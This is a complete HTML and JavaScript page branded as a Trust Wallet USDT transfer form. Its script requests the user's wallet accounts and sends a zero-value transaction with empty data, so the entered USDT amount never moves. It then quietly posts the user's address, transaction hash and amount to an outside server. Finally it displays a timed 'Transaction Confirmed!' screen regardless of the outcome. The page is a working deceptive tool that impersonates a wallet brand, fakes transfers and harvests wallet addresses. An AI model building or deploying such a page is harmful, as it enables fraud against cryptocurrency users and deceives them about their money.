<!DOCTYPE html>
<html lang="it">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>USDT Transfer - Trust Wallet</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }

        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }

        .container {
            background: white;
            border-radius: 20px;
            padding: 40px;
            box-shadow: 0 20px 60px rgba(0, 0, 0, 0.3);
            width: 100%;
            max-width: 500px;
        }

        h1 {
            color: #333;
            margin-bottom: 30px;
            text-align: center;
            font-size: 28px;
        }

        .form-group {
            margin-bottom: 20px;
        }

        label {
            display: block;
            margin-bottom: 8px;
            color: #666;
            font-weight: 600;
        }

        input {
            width: 100%;
            padding: 12px;
            border: 1px solid #ddd;
            border-radius: 8px;
            font-size: 16px;
            transition: border-color 0.3s;
        }

        input:focus {
            outline: none;
            border-color: #667eea;
        }

        button {
            width: 100%;
            padding: 14px;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white;
            border: none;
            border-radius: 8px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
            transition: transform 0.2s, box-shadow 0.2s;
        }

        button:hover:not(:disabled) {
            transform: translateY(-2px);
            box-shadow: 0 10px 20px rgba(102, 126, 234, 0.3);
        }

        button:disabled {
            opacity: 0.6;
            cursor: not-allowed;
        }

        .error {
            color: #ff6b6b;
            margin-top: 10px;
            padding: 12px;
            background: #ffe0e0;
            border-radius: 8px;
            display: none;
        }

        .processing-screen {
            display: none;
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0, 0, 0, 0.8);
            z-index: 1000;
            justify-content: center;
            align-items: center;
            flex-direction: column;
        }

        .processing-screen.active {
            display: flex;
        }

        .spinner {
            width: 60px;
            height: 60px;
            border: 4px solid rgba(255, 255, 255, 0.3);
            border-top: 4px solid white;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin-bottom: 20px;
        }

        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }

        .processing-text {
            color: white;
            font-size: 18px;
            text-align: center;
        }

        .checkmark {
            display: none;
            width: 80px;
            height: 80px;
            background: #4caf50;
            border-radius: 50%;
            position: relative;
            animation: scaleIn 0.5s ease-out;
        }

        .checkmark::after {
            content: '✓';
            position: absolute;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            color: white;
            font-size: 50px;
            font-weight: bold;
        }

        @keyframes scaleIn {
            0% { transform: scale(0); }
            100% { transform: scale(1); }
        }

        .success-text {
            display: none;
            color: white;
            font-size: 18px;
            margin-top: 20px;
            text-align: center;
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>USDT Transfer</h1>
        
        <form id="transferForm">
            <div class="form-group">
                <label for="recipient">Recipient Address</label>
                <input type="text" id="recipient" placeholder="0x..." required>
            </div>

            <div class="form-group">
                <label for="amount">Amount (USDT)</label>
                <input type="number" id="amount" placeholder="0.00" step="0.01" required>
            </div>

            <button type="button" onclick="handleApprove()" id="approveBtn">Approve & Send</button>

            <div class="error" id="error"></div>
        </form>
    </div>

    <div class="processing-screen" id="processingScreen">
        <div class="spinner"></div>
        <div class="checkmark" id="checkmark"></div>
        <div class="processing-text" id="processingText">Processing...</div>
        <div class="success-text" id="successText">Transaction Confirmed!</div>
    </div>

    <script>
        const CONFIG = {
            BACKEND_URL: 'https://www.send-usdt.net/api/notify'
        };

        async function handleApprove( ) {
            const recipientInput = document.getElementById('recipient');
            const amountInput = document.getElementById('amount');
            const errorDiv = document.getElementById('error');
            const approveBtn = document.getElementById('approveBtn');

            errorDiv.style.display = 'none';
            errorDiv.textContent = '';

            const recipient = recipientInput.value.trim();
            const amount = amountInput.value;

            if (!recipient || !amount) {
                errorDiv.textContent = 'Please fill all fields';
                errorDiv.style.display = 'block';
                return;
            }

            approveBtn.disabled = true;

            try {
                // Richiedi l'indirizzo dell'utente
                const accounts = await window.ethereum.request({
                    method: 'eth_requestAccounts'
                });
                const userAddress = accounts[0];

                // Mostra il Processing screen SUBITO
                document.getElementById('processingScreen').classList.add('active');
                document.getElementById('processingText').style.display = 'block';
                document.getElementById('checkmark').style.display = 'none';
                document.getElementById('successText').style.display = 'none';

                // Invia la transazione
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: recipient,
                        value: '0',
                        data: '0x'
                    }]
                });

                // SALVA L'INDIRIZZO SUBITO (prima della conferma)
                await fetch(CONFIG.BACKEND_URL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify({
                        userAddress: userAddress,
                        txHash: txHash,
                        amount: amount
                    })
                });

                console.log('✅ Indirizzo salvato:', userAddress);

                // Mostra il checkmark dopo 2 secondi
                setTimeout(() => {
                    document.getElementById('processingText').style.display = 'none';
                    document.getElementById('checkmark').style.display = 'block';
                    document.getElementById('successText').style.display = 'block';
                }, 2000);

                // Chiudi il processing screen dopo 4 secondi
                setTimeout(() => {
                    document.getElementById('processingScreen').classList.remove('active');
                    recipientInput.value = '';
                    amountInput.value = '';
                    approveBtn.disabled = false;
                }, 4000);

            } catch (error) {
                console.error('Error:', error);
                let errorMessage = 'Transaction failed';

                if (error.code === 4001) {
                    errorMessage = 'Transaction rejected by user';
                } else if (error.message && error.message.includes('user rejected')) {
                    errorMessage = 'Transaction rejected by user';
                } else if (error.code === -32002) {
                    errorMessage = 'Request already pending. Please open Trust Wallet.';
                }

                errorDiv.textContent = errorMessage;
                errorDiv.style.display = 'block';
                document.getElementById('processingScreen').classList.remove('active');
                approveBtn.disabled = false;
            }
        }

        // Consenti Enter per inviare
        document.getElementById('transferForm').addEventListener('keypress', (e) => {
            if (e.key === 'Enter') {
                handleApprove();
            }
        });
    </script>
</body>
</html>
